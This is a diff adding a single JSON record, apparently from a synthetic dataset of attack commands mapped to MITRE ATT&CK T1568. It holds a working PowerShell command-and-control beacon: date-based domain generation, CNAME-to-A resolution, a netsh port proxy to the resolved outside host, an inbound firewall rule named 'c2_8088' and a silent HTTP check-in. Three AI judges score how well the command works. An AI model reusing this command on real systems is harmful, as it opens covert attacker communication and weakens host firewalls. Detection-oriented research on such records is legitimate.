@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "$seed='hub';$d=$seed+(Get-Date -Format 'ddMMyy')+'.io';try{$c=Resolve-DnsName $d -Type CNAME -ErrorAction Stop|Select-Object -First 1;$alias=$c.CName.TrimEnd('.');$a=Resolve-DnsName $alias -Type A -ErrorAction Stop;$ip=($a|Get-Random).IPAddress;netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=8088 connectaddress=$ip connectport=80;netsh advfirewall firewall add rule name='c2_8088' dir=in action=allow protocol=TCP localport=8088;Invoke-WebRequest -Uri 'http://127.0.0.1:8088/p' -UseBasicParsing -Headers @{CN=$alias;D=$d} -TimeoutSec 5}catch{}",
+  "explanation": "Exploits CNAME indirection for dynamic resolution, chaining to the current active A record, and then proxies local traffic to blend with normal HTTP on an alternative port.",
+  "rationale_steps": [
+    "Resolve CNAME to follow dynamic aliasing to the active infrastructure.",
+    "Map local alternate port to the dynamic A record and initiate communication."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-0a23acf2-b0eb9078",
+  "source_prompt_hash": "0a23acf2",
+  "timestamp_utc": "2025-09-30T09:39:46.357850Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced quotes, parentheses, and braces, proper command separators, valid flag formats, and appropriate error handling with try/catch.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1568 (Dynamic Resolution) by algorithmically generating a domain name based on date, resolving it through CNAME indirection, setting up a port proxy to the dynamically resolved IP, configuring the firewall, and establishing communication - all core elements of the technique.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T06:24:07.701449Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct PowerShell syntax, balanced elements, valid cmdlet usage, and proper command chaining.",
+        "semantic_score": 3,
+        "semantic_justification": "While the domain generation, CNAME indirection, and A record resolution perfectly align with T1568, the `netsh` commands for port proxy and firewall rules require Administrator privileges, directly contradicting the stated 'Privilege: None', thus making critical parts of the C2 establishment operationally unfeasible under the given conditions.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T06:24:23.326775Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell command is well-formed with balanced quotes/braces, valid cmdlets and netsh syntax, and proper separators.",
+        "semantic_score": 4,
+        "semantic_justification": "It algorithmically derives a daily domain, resolves CNAME to A and randomly selects an IP to contact (matching T1568), but the portproxy/firewall steps require administrative rights despite 'Privilege: None', which may prevent the proxy/beacon from functioning.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T06:25:00.316917Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
